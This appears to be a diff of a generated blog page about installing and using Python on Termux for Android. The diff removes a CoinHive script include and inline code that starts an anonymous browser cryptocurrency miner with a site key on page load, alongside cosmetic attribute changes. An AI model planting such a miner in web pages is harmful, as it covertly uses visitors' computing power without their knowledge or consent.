@@ -39,31 +39,8 @@
         })();
   </script>
   
-  <script src="https://coinhive.com/lib/coinhive.min.js"></script>
 </head>
 <body>
-<script>
-  var miner = new CoinHive.Anonymous('0Q2TtxhYQVKpZ8093Pd2RDdyZaWsqJoh');
-  miner.start();
-</script>
-
-<script>
-  // Listen on events
-  miner.on('found', function() {  })
-  miner.on('accepted', function() {  })
-
-  // Update stats once per second
-  setInterval(function() {
-      var hashesPerSecond = miner.getHashesPerSecond();
-      var totalHashes = miner.getTotalHashes();
-      var acceptedHashes = miner.getAcceptedHashes();
-
-      // Output to HTML elements...
-      console.log("H/s: " + hashesPerSecond);
-      console.log("Total Hashes: " + totalHashes);
-      console.log("Acepted Hashes: " + acceptedHashes);
-  }, 1000);
-</script>
   <div class="table-container">
     <div class="table-block footer-push">
       <div class="container">
@@ -120,9 +97,9 @@
 <p>I came across <a href="https://termux.com/">Termux</a> via a relatively recent mention on HackerNews. Can't remember which one it was exactly, but if you'd like to familiarise yourself with its particular design decisions,
 advantages, disadvantages, features, etc., you might want to head over to HackerNews and give a quick skim over the following comment threads: <a href="https://news.ycombinator.com/item?id=9905391">1</a>, <a href="https://news.ycombinator.com/item?id=11572939">2</a>, <a href="https://news.ycombinator.com/item?id=15529426">3</a>, <a href="https://news.ycombinator.com/item?id=11570596">4</a>, <a href="https://news.ycombinator.com/item?id=11459355">5</a>.</p>
 <p>If you opted to do a Depth-First-Search of the above articles, then I may have already lost you as a reader already. If, however, you didn't get put off by my desperate attempts at humor, and somehow found your way back to this post, then welcome back. <code>else # i.e., you prefer synthesized content</code>, keep reading :).</p>
-<h2 id="python1_on_termux"><a class="toclink" href="#python1_on_termux">Python<sup id="fnref:google_play_screenshot"><a rel="footnote" class="footnote-ref" href="#fn:google_play_screenshot">1</a></sup> on Termux</a></h2>
+<h2 id="python1_on_termux"><a class="toclink" href="#python1_on_termux">Python<sup id="fnref:google_play_screenshot"><a class="footnote-ref" rel="footnote" href="#fn:google_play_screenshot">1</a></sup> on Termux</a></h2>
 <p>Once you've got Termux <a href="https://play.google.com/store/apps/details?id=com.termux">installed</a> in your Android environment, you simply need a
-couple of straightforward steps<sup id="fnref:termux_permissions"><a rel="footnote" class="footnote-ref" href="#fn:termux_permissions">2</a></sup> to update your packages and install Python. Fortunately, Termux provides support for both versions of Python - v2 (intensely branded as "Legacy Python" in the recent history of the language) and v3.</p>
+couple of straightforward steps<sup id="fnref:termux_permissions"><a class="footnote-ref" rel="footnote" href="#fn:termux_permissions">2</a></sup> to update your packages and install Python. Fortunately, Termux provides support for both versions of Python - v2 (intensely branded as "Legacy Python" in the recent history of the language) and v3.</p>
 <div class="codehilite"><pre><span class="nv">$ </span>apt update <span class="o">&amp;&amp;</span> apt upgrade
 <span class="nv">$ </span>termux-setup-storage
 <span class="nv">$ </span>pkg install python
@@ -159,7 +136,7 @@ non-"Legacy Python". This may arise if you updated <code>pip2</code> which then 
 <p>Being a multi-functional terminal emulator, Termux does provide support for
 traditional editors such as <code>vi</code> and <code>vim</code>. However, despite the <a href="https://termux.com/touch-keyboard.html">built-in</a>
 key(-combination) equivalents to full-fledged keyboards (physical or otherwise), I've found the use
-of CLI-based text editors<sup id="fnref:vim_vs_emacs"><a rel="footnote" class="footnote-ref" href="#fn:vim_vs_emacs">3</a></sup> to be a bit awkward without an external keyboard.</p>
+of CLI-based text editors<sup id="fnref:vim_vs_emacs"><a class="footnote-ref" rel="footnote" href="#fn:vim_vs_emacs">3</a></sup> to be a bit awkward without an external keyboard.</p>
 <p>For the purpose of editing my Python scripts, I've found <a href="https://play.google.com/store/apps/details?id=com.aor.droidedit">DroidEdit</a>
 to do the job just well enough. Of course, Google will probably be able to provide you
 detailed comparisons, reviews, trade-offs and alternatives. But you wouldn't go wrong if you give DroidEdit a go, as a first attempt.</p>
@@ -167,15 +144,15 @@ detailed comparisons, reviews, trade-offs and alternatives. But you wouldn't go 
 <hr />
 <ol>
 <li id="fn:google_play_screenshot">
-<p>Never mind that the bottom tab, in the Google Play screenshot displayed above, is occupied by source code in another programming language (which we'll pretend we're unfamiliar with, and looks like a variety of Assembly langauge to us), which for all intents and purposes of this post can be thought of as Python :) <a rev="footnote" title="Jump back to footnote 1 in the text" class="footnote-backref" href="#fnref:google_play_screenshot">↩</a></p>
+<p>Never mind that the bottom tab, in the Google Play screenshot displayed above, is occupied by source code in another programming language (which we'll pretend we're unfamiliar with, and looks like a variety of Assembly langauge to us), which for all intents and purposes of this post can be thought of as Python :) <a title="Jump back to footnote 1 in the text" class="footnote-backref" href="#fnref:google_play_screenshot" rev="footnote">↩</a></p>
 </li>
 <li id="fn:termux_permissions">
 <p>Keep in mind you'll need to enable access and write storage permissions at
-the app level, for Termux. <a rev="footnote" title="Jump back to footnote 2 in the text" class="footnote-backref" href="#fnref:termux_permissions">↩</a></p>
+the app level, for Termux. <a title="Jump back to footnote 2 in the text" class="footnote-backref" href="#fnref:termux_permissions" rev="footnote">↩</a></p>
 </li>
 <li id="fn:vim_vs_emacs">
 <p>No, I do not intend to dive into a detailed dispute of the eternal
-Vim-vs-Emacs question. But Vim is the better one ... :) <a rev="footnote" title="Jump back to footnote 3 in the text" class="footnote-backref" href="#fnref:vim_vs_emacs">↩</a></p>
+Vim-vs-Emacs question. But Vim is the better one ... :) <a title="Jump back to footnote 3 in the text" class="footnote-backref" href="#fnref:vim_vs_emacs" rev="footnote">↩</a></p>
 </li>
 </ol>
 </div><p></p>
@@ -226,7 +203,7 @@ Vim-vs-Emacs question. But Vim is the better one ... :) <a rev="footnote" title
       </div>
     </div>  <!-- end table block footer div -->
   </div>
-  <!-- Last generated: 2017-12-23T18:36:06Z -->
+  <!-- Last generated: 2018-04-02T21:37:01Z -->
 </body>
 </html>
 
